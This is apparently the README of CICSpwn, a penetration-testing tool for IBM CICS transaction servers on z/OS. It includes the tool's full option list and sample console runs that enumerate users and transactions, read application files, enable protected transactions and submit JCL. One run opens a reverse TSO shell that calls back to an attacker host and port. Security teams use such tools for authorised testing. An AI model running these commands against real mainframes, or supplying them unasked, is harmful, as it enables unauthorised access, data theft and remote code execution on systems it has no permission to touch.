# CICSpwn
## Description  
CICSpwn is a tool to pentest CICS Transaction servers on z/OS.

## Features    
* Get general information about CICS and the underlying z/OS  
  * List available IBM supplied transactions
  * Get active sessions and userids
  * Get path (HLQ) of files and libraries
  * Check if CICS is using RACF/ACF2/TopSecret   
* Read files created by the application 
* Enables CECI and CEMT if they are RACF protected
* Remotely execute code using Spoolopen and TDqueue
* Checks security settings on z/OS
## Usage
```
$python cicspwn.py -h

       ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    ::: 
      :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+: 
      +:+             +:+      +:+         +:+         +:+    +:++:+       +:+:+:+:+  +:+ 
      +#+             +#+      +#+         +#++:++#++  +#++:++#+ +#+  +:+  +#++#+ +:+ +#+  
      +#+             +#+      +#+                +#+  +#+       +#+ +#+#+ +#++#+  +#+#+# 
      #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+# 
       ########   ###########   ########    ########   ###         ###   ###  ###    #### 
      
                            The tool for some CICS p0wning !		Author: @Ayoul3__

CicsPwn: a tool to pentest CICS transaction servers on z/OS

positional arguments:
  IP                    The z/OS Mainframe IP or Hostname
  PORT                  CICS/VTAM server Port

optional arguments:
  -h, --help            show this help message and exit
  -a APPLID, --applid APPLID
                        CICS ApplID on VTAM, default is CICS

Information gathering:
  -A, --all             Gather all information about a CICS Transaction Server
  -i, --info            Gather basic information about a CICS region
  -u, --userids         Scrape userids found in different menus
  -p PATTERN, --pattern PATTERN
                        Specify a pattern of a files/transaction/tsqueue to
                        get (default is "*")
  -q, --quiet           Remove Trailing and journal before performing any
                        action
  --ceci CECI           CECI new transaction name. Result of -i option.
  --cemt CEMT           CEMT new transaction name. Result of -i option.

Storage options:
  -f, --files           List all installed files a on TS CICS
  -e, --tsqueues        List all temporary storage queues on TS CICS
  --get-file FILENAME   Get the content of a file. It attempts to change the
                        status of the file if it's not enabled, opened or
                        readable
  --get-tsq TSQ_NAME    Get the content of a temporary storage queue.
  --enable-files ENA_FILES
                        Enable a file (keyword ALL to enable every file)

Transaction options:
  -t, --trans           Get all installed transactions on a CICS TS server
  --enable-trans ENA_TRANS
                        Enable a transaction (keyword ALL to enable every
                        transaction)

Access options:
  -U USERID, --userid USERID
                        Specify a userid to use on CICS
  -P PASSWORD, --password PASSWORD
                        Specify a password for the userid
  -r PROPAGATE_USER     Given the region user ID, checks wether you are
                        allowed to use it to submit JOBs
  -g SURROGAT_USER      Checks wether you can impersonate another user when
                        submitting a job

JOB options:
  -s SUBMIT, --submit SUBMIT
                        Submit JCL to CICS server. Specify:
                        dummy,reverse_unix, reverse_tso, direct_unix,
                        reverse_unix, ftp or custom (need -j option)
  --queue QUEUE         Provides the name of the TD queue to submit a JOB
  --ftp-cmds FTP_CMDS   Files containig a list of ftp commands to execute
  --node NODE           System node name where the JOB should be submitted
                        (works only with Spool functions)
  -l LHOST, --lhost LHOST
                        Remote server to call back to for reverse shell
                        (host:port)
  --port PORT           Remote port to open for bind shell in REXX
  -j JCL, --jcl JCL     Custom JCL file to provide

```
## Prerequisites
3270 Python library [py3270](https://pypi.python.org/pypi/py3270/0.2.0)

## Getting general information
```
root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
[+] Connecting to target 192.168.1.207:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting information about CICS server (APPLID: CICS)
	[*] CICS TS Version: 3.2
	[*] CICS default user: CICSUSER
[+] Interesting and available IBM supplied transactions: 
	[*] CEMT
	[*] CEDA
	[*] CECI
	[*] CECS
	[*] CEBR
[+] General system information: 
	[*] Userid: CICSUSER
	[*] Sysid: S650
	[*] LU session name: LCL702
	[*] language: E
	[*] Files HLQ:	CICS650.**
	[*] Library path:	DFH320.CICS.**
[+] Active users
	[*] CICSUSER
	[*] CICSUSER
	[*] CICSUSER
[+] JCL Submission
	[*] Access to the internal spool is apparently available
[+] Access control
	[*] CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID

```
## Read a file
```
root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
[+] Connecting to target 192.168.1.207:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting Attributes of file FILEA
[*] File FILEA is enabled, open, and readable
[*] Record size: 80	keylength:6
RECORD 1
RECORD 2
...

```

## List TSQueues
```
root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -e
[+] Connecting to target 192.168.1.207:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting all tsqueues that match *
Tsqueue	Items	Length	Transaction
KOS5	00001	0000000064	CECI
TEST	00001	0000000064	CECI
TES5	00001	0000000064	CECI
...

```

## List TSQueues
```
root@kali:~/cics# python cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 --enable-tran ALL
[+] Connecting to target 192.168.1.207:23
[*] Access to CICS Terminal is possible with APPID CICS
[*] Successful authentication
[+] Activating ALL transactions
[*] All transactions are enabled

...

```

## Reverse shell using CICSpwn
```
root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 192.168.1.16:4445
[+] Connecting to target 192.168.1.209:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Setting the current terminal to mixed case
[*] Got TerminalID L702
[*] Current terminal is NOW mixed case
[+] Spool not available apparently, trying via TDQueue
[+] Writing to the internal TDQueue
	[*] JCL Written to TDqueue, it should be executed any second

```

## Copyright and license  
cicsPWN is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  
CICSpwn is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with nmaptocsv. If not, see http://www.gnu.org/licenses/.

## Credit
The REXX code of the reverse shell was mainly inspired by the work of [@mainframed767](https://github.com/mainframed/Mainframed)

## Contact
Ayoub ELAASSAL ayoul3.zos at gmail dot com
